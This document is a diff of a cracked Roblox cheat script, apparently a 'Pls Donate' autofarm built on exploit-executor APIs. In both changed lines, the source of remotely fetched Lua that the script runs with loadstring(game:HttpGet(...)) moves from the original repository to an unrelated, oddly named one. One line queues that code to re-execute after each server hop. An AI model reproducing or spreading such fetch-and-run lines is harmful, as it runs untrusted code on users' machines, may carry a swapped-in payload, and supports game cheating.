@@ -43,7 +43,7 @@ local errCount = 0
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
-local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/heqds/Pls-Donate-Autofarm/main/ui.lua")()
+local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/weewoowaawaa/aeuohnuonouaerbhhide/main/ui.lua")()
 local win = Flux:Window("CapySploit", "Cracked by heqds#2146", Color3.fromRGB(0, 128, 0), Enum.KeyCode.RightShift)
 local function claimGifts()
     pcall(function()
@@ -790,7 +790,7 @@ end)
 
 serverHopTab:Toggle("Re-Execute", "Executes the script after server hop\nTurn this off if you use autoexec", getgenv().settings.reex, function(t)
     if t and not exd then
-        queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/heqds/Pls-Donate-Autofarm/main/main.lua'))()")
+        queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/weewoowaawaa/aeuohnuonouaerbhhide/main/main.lua'))()")
         exd = true
     end
     if settingsLock then return end
